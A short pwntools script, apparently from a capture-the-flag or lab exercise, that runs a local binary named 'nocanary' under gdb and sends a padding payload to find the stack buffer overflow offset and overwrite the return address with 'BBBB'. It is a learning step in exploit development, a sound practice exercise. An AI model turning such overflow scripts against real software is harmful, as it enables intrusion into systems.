from pwn import *

PROCESS = "./nocanary"

p = gdb.debug(PROCESS, "c")


############# CHECK #############
CYCLIC_VAL = 0x61616173
OFFSET = cyclic_find(CYCLIC_VAL) + 4
PAYLOAD = b"A"* OFFSET
PAYLOAD += b"BBBB"
#PAYLOAD += b"CCCC"

#PAYLOAD = cyclic(500)

p.writeline(PAYLOAD)
p.writeline(PAYLOAD)

p.interactive()
